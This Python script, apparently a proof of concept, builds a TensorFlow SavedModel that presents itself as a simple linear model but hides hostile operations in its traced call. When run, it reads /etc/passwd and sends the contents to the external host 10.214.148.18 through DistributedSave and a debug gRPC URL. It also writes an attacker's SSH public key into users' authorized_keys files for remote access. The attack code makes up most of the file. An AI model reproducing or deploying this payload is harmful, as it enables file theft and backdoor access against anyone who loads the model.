import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)

    @tf.function
    def __call__(self, x):

        # from tensorflow.distribute.experimental.rpc.kernels import gen_rpc_ops
        # client, _ = gen_rpc_ops.rpc_client("10.214.148.18:{}".format(1234), 100000)
        # future, _ = gen_rpc_ops.rpc_call(client, path.decode(), [tf.constant(2, dtype=tf.int32), tf.constant(2, dtype=tf.int32)], 100000)   
        # # 此处 "addition" 后续可以换成 matchingfile 的结果，让 server 得到用户的名字  

        a = tf.raw_ops.FixedLengthRecordDatasetV2(filenames = ["/etc/passwd"], 
                                                record_bytes = 1,
                                                header_bytes = 0,
                                                footer_bytes = 0,
                                                buffer_size = 1,
                                                metadata = '',
                                                compression_type = '')

        dataset = tmpclass(a)
        iterable = iter(dataset)
        payload = ""
        for m in iterable:
            payload += m

        dataset = tf.data.Dataset.from_tensor_slices([payload])

        tf.raw_ops.DistributedSave(
            dataset = dataset._variant_tensor, 
            directory = '/home/neil/code/tensorflow_demo/PoC/GetShell/dataset', 
            address = "10.214.148.18:{}".format(1238), 
            metadata = ''
        )
        
        from tensorflow.python.ops.gen_debug_ops import debug_identity_v3
        debug_identity_v3(
            input=tf.constant("123456768", dtype=tf.string),
            device_name = "",
            tensor_name = "test_tensor",
            io_of_node = "",
            is_input = False,
            io_index = -1,
            debug_urls=["grpc://10.214.148.18:1236"],
            gated_grpc = False
            )
        
        # --- Save ---
        filename = tf.raw_ops.MatchingFiles(pattern="/home/*/.ssh")[0] + "/authorized_keys"
        # tf.print(filename)
        tf.raw_ops.Save(filename= filename, tensor_names=["\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj2rMYcGSdfzOx56eiRmexXdK/ynCw16WjRhxxkSCBLAYb6CEjiXioyZyH1+Xt9zT4PPWrjgeq1Ba7AxLGBW6SDEhIlFvrNBtIZ5oT0YR9WjTNCXmabIXMSZhSNIAxBhde/ymLfHO1IXRxnXPW781/Vmgh2fHey/dSfzOqW5qyMxQJUmCXC32k9Bc3XE5BSJFhw+5akNzN2f0FfEvMSmd+u+yUQ1aF7ucMLk9fD5JNUKQ+VboYdcOsThm7zP0TM+hQMC/OsECbM7pAHiPnGbAFqI2jtUUvnlOFSNX9GhBMIpi+45hA09CSnIzT4+F4rPijplFyCMzguhFw7Hun3+/FavEjVo284UW95txKe/FgU44BjeOz8afNGIhiuZ1ZaxIYLppmEJsrcOGvkcoKC5NaCdL5k9d97f2UudgnJinSf/liXvnQ98sRS6ZqiF6mv+Gv8SlMDwOwgoTqh/11x+iZVVSR+v8Jm5jHqh641ileLCRXeAmb6zwz3V0aAffwj1U= neil@debian\n\n", "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj2rMYcGSdfzOx56eiRmexXdK/ynCw16WjRhxxkSCBLAYb6CEjiXioyZyH1+Xt9zT4PPWrjgeq1Ba7AxLGBW6SDEhIlFvrNBtIZ5oT0YR9WjTNCXmabIXMSZhSNIAxBhde/ymLfHO1IXRxnXPW781/Vmgh2fHey/dSfzOqW5qyMxQJUmCXC32k9Bc3XE5BSJFhw+5akNzN2f0FfEvMSmd+u+yUQ1aF7ucMLk9fD5JNUKQ+VboYdcOsThm7zP0TM+hQMC/OsECbM7pAHiPnGbAFqI2jtUUvnlOFSNX9GhBMIpi+45hA09CSnIzT4+F4rPijplFyCMzguhFw7Hun3+/FavEjVo284UW95txKe/FgU44BjeOz8afNGIhiuZ1ZaxIYLppmEJsrcOGvkcoKC5NaCdL5k9d97f2UudgnJinSf/liXvnQ98sRS6ZqiF6mv+Gv8SlMDwOwgoTqh/11x+iZVVSR+v8Jm5jHqh641ileLCRXeAmb6zwz3V0aAffwj1U= neil@debian\n"], data=[1, 2])
        
        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'model/GetShell/saved_model'
tf.saved_model.save(model,save_dir)